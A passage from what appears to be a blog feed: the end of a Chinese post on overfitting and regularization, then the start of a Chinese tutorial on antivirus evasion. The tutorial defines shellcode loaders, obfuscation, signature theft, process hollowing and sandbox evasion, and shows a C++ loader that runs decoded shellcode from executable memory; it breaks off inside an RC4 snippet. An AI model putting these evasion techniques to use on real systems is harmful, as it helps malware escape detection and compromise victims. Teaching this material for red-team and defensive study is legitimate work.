id="过拟合-Overfitting">过拟合(Overfitting)</h2><p><strong>过拟合</strong>是指一个模型在<strong>训练数据上表现很好，但在新数据（测试集）上表现很差</strong>。也就是说，它“学得太好了”，以至于<strong>学会了训练数据的噪声和细节，而不是通用的模式</strong>。</p><h3 id="举个例子">举个例子</h3><p>假设你想用机器学习判断一个人是否会买冰淇淋，输入特征是温度：</p><ul><li>你有10个训练样本，某个模型刚好在这10个点上拟合得非常完美（准确率100%）。</li><li>但当你拿新的天气数据测试时，它的判断变得很差。</li></ul><p>这种情况就叫<strong>过拟合</strong>。</p><h3 id="防止过拟合">防止过拟合</h3><p>防止过拟合有以下方法：</p><ol><li><p>收集更多的数据</p></li><li><p>选择特征</p></li><li><p>减少参数的大小</p><p>正则化(<code>Regularization</code>)</p></li></ol><h2 id="正则化">正则化</h2><p>在训练模型时，如果不加控制，模型可能会学得非常“贴合”训练数据（过拟合）。<br>正则化通过在损失函数中添加一项“惩罚项”，<strong>鼓励模型参数更小或更稀疏</strong>，从而避免复杂模型。</p><h3 id="正则化-Ridge正则">正则化(Ridge正则)</h3><ul><li>惩罚项：所有权重的平方和</li></ul><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -2.697ex;" xmlns="http://www.w3.org/2000/svg" width="27.108ex" height="4.847ex" role="img" focusable="false" viewbox="0 -950 11981.9 2142.2" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mtext"><path data-c="4C" d="M128 622Q121 629 117 631T101 634T58 637H25V683H36Q48 680 182 680Q324 680 348 683H360V637H333Q273 637 258 635T233 622L232 342V129Q232 57 237 52Q243 47 313 47Q384 47 410 53Q470 70 498 110T536 221Q536 226 537 238T540 261T542 272T562 273H582V268Q580 265 568 137T554 5V0H25V46H58Q100 47 109 49T128 61V622Z" style="stroke-width: 3;"/><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(625,0)" style="stroke-width: 3;"/><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(1125,0)" style="stroke-width: 3;"/><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(1519,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2190.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(3246.6,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">原</text><text data-variant="normal" transform="translate(1000,0) scale(1,-1)" font-size="884px" font-family="serif">始</text><text data-variant="normal" transform="translate(2000,0) scale(1,-1)" font-size="884px" font-family="serif">损</text><text data-variant="normal" transform="translate(3000,0) scale(1,-1)" font-size="884px" font-family="serif">失</text></g><g data-mml-node="mo" transform="translate(7468.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(8469,0)"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z" style="stroke-width: 3;"/></g><g data-mml-node="munder" transform="translate(9218.7,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(600,-1084.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="msubsup" transform="translate(10829.3,0)"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(749,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(749,-247) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mtext>Loss</mtext><mo>=</mo><mtext>原始损失</mtext><mo>+</mo><mi>λ</mi><munder><mo data-mjx-texclass="OP">∑</mo><mrow data-mjx-texclass="ORD"><mi>i</mi></mrow></munder><msubsup><mi>w</mi><mi>i</mi><mn>2</mn></msubsup></math></mjx-assistive-mml></mjx-container><ul><li>效果：鼓励权重变小但不为零，适合大多数模型。</li></ul><h3 id="L1正则化-Lasso正则">L1正则化(Lasso正则)</h3><ul><li>惩罚项：所有权重的绝对值和</li></ul><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -2.697ex;" xmlns="http://www.w3.org/2000/svg" width="28.118ex" height="4.847ex" role="img" focusable="false" viewbox="0 -950 12428.3 2142.2" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mtext"><path data-c="4C" d="M128 622Q121 629 117 631T101 634T58 637H25V683H36Q48 680 182 680Q324 680 348 683H360V637H333Q273 637 258 635T233 622L232 342V129Q232 57 237 52Q243 47 313 47Q384 47 410 53Q470 70 498 110T536 221Q536 226 537 238T540 261T542 272T562 273H582V268Q580 265 568 137T554 5V0H25V46H58Q100 47 109 49T128 61V622Z" style="stroke-width: 3;"/><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(625,0)" style="stroke-width: 3;"/><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(1125,0)" style="stroke-width: 3;"/><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(1519,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2190.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(3246.6,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">原</text><text data-variant="normal" transform="translate(1000,0) scale(1,-1)" font-size="884px" font-family="serif">始</text><text data-variant="normal" transform="translate(2000,0) scale(1,-1)" font-size="884px" font-family="serif">损</text><text data-variant="normal" transform="translate(3000,0) scale(1,-1)" font-size="884px" font-family="serif">失</text></g><g data-mml-node="mo" transform="translate(7468.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(8469,0)"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z" style="stroke-width: 3;"/></g><g data-mml-node="munder" transform="translate(9218.7,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(600,-1084.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(10829.3,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(11107.3,0)"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(749,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(12150.3,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mtext>Loss</mtext><mo>=</mo><mtext>原始损失</mtext><mo>+</mo><mi>λ</mi><munder><mo data-mjx-texclass="OP">∑</mo><mrow data-mjx-texclass="ORD"><mi>i</mi></mrow></munder><mo data-mjx-texclass="ORD" stretchy="false">|</mo><msub><mi>w</mi><mi>i</mi></msub><mo data-mjx-texclass="ORD" stretchy="false">|</mo></math></mjx-assistive-mml></mjx-container><ul><li>效果：会让一些权重变为 0，相当于特征选择（变得稀疏）。</li></ul><h2 id="参考">参考</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://github.com/x2nn/machine-learning">https://github.com/x2nn/machine-learning</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> AI相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逻辑回归 </tag>
            
            <tag> 机器学习 </tag>
            
            <tag> 过拟合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀基础知识</title>
      <link href="/2025/04/04/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2025/04/04/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识">基础知识</h2><h3 id="1-什么是免杀">1. 什么是免杀?</h3><p>免杀（<code>BypassAV</code>）是指通过修改恶意软件的行为、代码结构或加载方式，使其不被杀毒软件检测到。免杀技术广泛应用于渗透测试、红队攻防等领域。<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p><h3 id="2-免杀的常见目标">2.免杀的常见目标</h3><ul><li><p><strong>Windows Defender</strong>：Windows系统自带的安全防护工具。</p></li><li><p><strong>360安全卫士</strong>：国内常见的杀毒软件，检测能力较强。</p></li><li><p><strong>火绒</strong>：一款轻量级的国产杀软，以低误报率著称。</p></li><li><p><strong>卡巴斯基、ESET、Norton</strong>：国外常见的杀软，检测能力较强。</p></li></ul><h3 id="3-免杀的核心思想">3.免杀的核心思想</h3><ul><li><p><strong>降低特征匹配</strong>：减少杀软特征库中匹配到的特征。</p></li><li><p><strong>行为隐藏</strong>：通过混淆、加密、分离加载等方式隐藏恶意行为。</p></li><li><p><strong>利用系统机制</strong>：利用系统API、回调函数等合法机制执行恶意代码。</p></li></ul><h2 id="免杀中的专业名词">免杀中的专业名词</h2><h3 id="1-Shellcode">1. Shellcode</h3><ul><li><p><strong>定义</strong>：一段用于执行特定功能的机器代码，通常以二进制形式存在。</p></li><li><p><strong>用途</strong>：常用于反向连接、持久化等操作。</p></li><li><p><strong>免杀方法</strong>：加密、混淆、分离加载。</p></li></ul><p>简单理解，就像一段魔法咒语，念出来就能实现特定功能。</p><h3 id="2-Loader（加载器）">2. Loader（加载器）</h3><ul><li><p><strong>定义</strong>：用于加载和执行Shellcode的程序。</p></li><li><p><strong>用途</strong>：将加密或混淆的Shellcode加载到内存中执行。</p></li><li><p><strong>免杀方法</strong>：使用合法API、回调函数、多线程等技术。</p></li></ul><p>简单理解，就是一个程序启动器，用来启动需要启动的恶意程序。</p><h3 id="3-Obfuscation（混淆）">3. Obfuscation（混淆）</h3><ul><li><p><strong>定义</strong>：通过修改代码结构、变量名、控制流等，使代码难以理解。</p></li><li><p><strong>用途</strong>：降低杀软静态分析的效果。</p></li><li><p><strong>常见工具</strong>：ConfuserEx、Dotfuscator。</p></li></ul><p>简单理解，就像把一篇文章写得乱七八糟，谁也看不懂。</p><h3 id="4-Entropy（熵值）">4. Entropy（熵值）</h3><ul><li><p><strong>定义</strong>：衡量数据随机性的指标，熵值越高，数据越随机。</p></li><li><p><strong>用途</strong>：杀软通过检测高熵值数据来识别加密的恶意代码。</p></li><li><p><strong>免杀方法</strong>：降低Shellcode的熵值，例如分段加载。</p></li></ul><p>简单理解，就像检测食物的辣度，太辣了就会引起注意。</p><h3 id="5-Signature（签名）">5. Signature（签名）</h3><ul><li><p><strong>定义</strong>：用于验证程序合法性的数字证书。</p></li><li><p><strong>用途</strong>：劫持合法签名可以绕过杀软的信任机制。</p></li><li><p><strong>免杀工具</strong>：SigThief。</p></li></ul><p>简单理解，就像伪造身份证，骗过安检人员。</p><h3 id="6-Reflective-DLL-Injection（反射式DLL注入）">6. Reflective DLL Injection（反射式DLL注入）</h3><ul><li><p><strong>定义</strong>：一种将DLL直接加载到目标进程内存中的技术，无需将DLL写入磁盘。</p></li><li><p><strong>用途</strong>：常用于绕过杀软的文件扫描和静态检测。</p></li></ul><p>简单理解，就像把一本书的内容直接塞进别人的脑子里，不用把书递给他。</p><h3 id="7-Process-Hollowing（进程镂空）">7. Process Hollowing（进程镂空）</h3><ul><li><p><strong>定义</strong>：一种将合法进程的内容替换为恶意代码的技术。</p></li><li><p><strong>用途</strong>：常用于隐藏恶意代码的行为。</p></li></ul><p>简单理解，就像把一个苹果挖空，里面塞了个炸弹，外面看起来还是个苹果。</p><h3 id="8-API-Hooking（API钩子）">8. API Hooking（API钩子）</h3><ul><li><p><strong>定义</strong>：一种拦截和修改API调用的技术。</p></li><li><p><strong>用途</strong>：常用于隐藏恶意行为或修改程序行为。</p></li></ul><p>简单理解，就像在电话线上装个窃听器，偷听并修改对方的通话内容。</p><h3 id="9-Code-Cave（代码洞穴）">9. Code Cave（代码洞穴）</h3><ul><li><p><strong>定义</strong>：一段未被使用的内存区域，可以用来插入额外的代码。</p></li><li><p><strong>用途</strong>：常用于隐藏恶意代码或增加功能。</p></li></ul><p>简单理解，就像在墙里挖个洞，里面藏了把钥匙。</p><h3 id="10-Sandbox-Evasio（沙箱逃逸）">10. Sandbox Evasio（沙箱逃逸）</h3><ul><li><p><strong>定义</strong>：一种检测和逃避沙箱环境的技术。</p></li><li><p><strong>用途</strong>：常用于避免在沙箱中被检测。</p></li></ul><p>简单理解，就像在实验室里装正常人，一出实验室就变身坏蛋。</p><h2 id="免杀技术分类">免杀技术分类</h2><h3 id="1-静态免杀">1. 静态免杀</h3><ul><li><strong>定义</strong>：通过修改文件结构、代码或资源，避免杀软静态扫描检测。</li><li><strong>常见方法</strong>：<ul><li>代码混淆</li><li>加密<code>Shellcode</code></li><li>添加合法签名</li><li>修改文件图标</li></ul></li></ul><h4 id="Base64混淆Shellcode"><code>Base64</code>混淆<code>Shellcode</code></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Base64混淆Shellcode</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 简单Base64解码函数</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title">base64_decode</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 实现Base64解码逻辑（此处省略具体实现）</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>*)input; <span class="comment">// 实际需正确解码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* base64_shellcode = <span class="string">&quot;aGVsbG8gd29ybGQ=&quot;</span>; <span class="comment">// 示例Base64编码的Shellcode</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* shellcode = <span class="built_in">base64_decode</span>(base64_shellcode);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 分配内存并执行</span></span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="built_in">strlen</span>((<span class="type">char</span>*)shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, shellcode, <span class="built_in">strlen</span>((<span class="type">char</span>*)shellcode));</span><br><span class="line">    ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="RC4加密Shellcode"><code>RC4</code>加密<code>Shellcode</code></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RC4加密Shellcode</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RC4加密算法实现</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">int</span> data_len, <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">int</span> key_len)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>];</span><br><span class="line">    <span class="type">int</span> i, j = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 初始化S数组</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        S[i] = (<span class="type">unsigned</span> <span class="type">char</span>)i;</span><br><span class="line">    &#125;</span><br><span 